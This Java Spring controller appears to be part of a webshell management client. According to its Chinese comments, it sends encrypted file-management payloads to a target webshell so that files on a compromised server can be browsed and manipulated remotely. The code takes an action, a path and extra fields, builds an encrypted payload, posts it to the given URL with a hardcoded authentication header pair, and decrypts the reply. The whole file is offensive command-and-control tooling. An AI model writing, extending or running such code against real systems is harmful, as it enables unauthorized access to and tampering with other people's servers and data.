package org.nox.controller;

import org.nox.tools.HttpRequestUtil;
import org.nox.tools.PayloadGenerater;
import org.nox.tools.ResultReader;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.Map;

/**
 * 文件管理控制器。
 * 向目标 Webshell 发送文件管理 Payload，实现远程文件浏览与操作。
 */
@RestController
@RequestMapping("/file")
public class FileController {

    /**
     * 文件管理接口（POST JSON）。
     * @param body 包含 url, action, path, extra 字段
     * @return 解密后的操作结果
     * @throws Exception 网络或处理异常
     */
    @PostMapping
    public String file(@RequestBody Map<String, String> body) throws Exception {
        String url = body.get("url");
        String action = body.get("action");
        String path = body.get("path");
        String extra = body.getOrDefault("extra", "");
        return handleFile(url, action, path, extra);
    }

    /**
     * 实际处理文件操作的私有方法。
     * 将 action、path、extra 拼接为命令字符串，生成文件管理模式的加密 Payload 并发送给目标，解密响应后返回。
     */
    private String handleFile(String url, String action, String path, String extra) throws Exception {
        System.out.println("[FileController] action=" + action + ", path=" + path + ", url=" + url);
        String cmd = action + "|" + path + "|" + extra;
        String payload = PayloadGenerater.generate(2, cmd);
        HashMap<String, String> headers = new HashMap<String, String>();
        headers.put("Usage-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36");
        headers.put("e10adc3949ba59ab", "be56e057f20f883e");
        HttpRequestUtil.Response response = HttpRequestUtil.post(url, headers, payload);
        System.out.println("[FileController] HTTP " + response.statusCode());
        if (response.statusCode() == 200) {
            String result = response.body();
            System.out.println("[FileController] Raw response length=" + result.length());
            result = ResultReader.read(result);
            System.out.println("[FileController] Decrypted result prefix=" + (result.length() > 50 ? result.substring(0, 50) : result));
            return result;
        }
        return "ERROR|HTTP " + response.statusCode();
    }
}
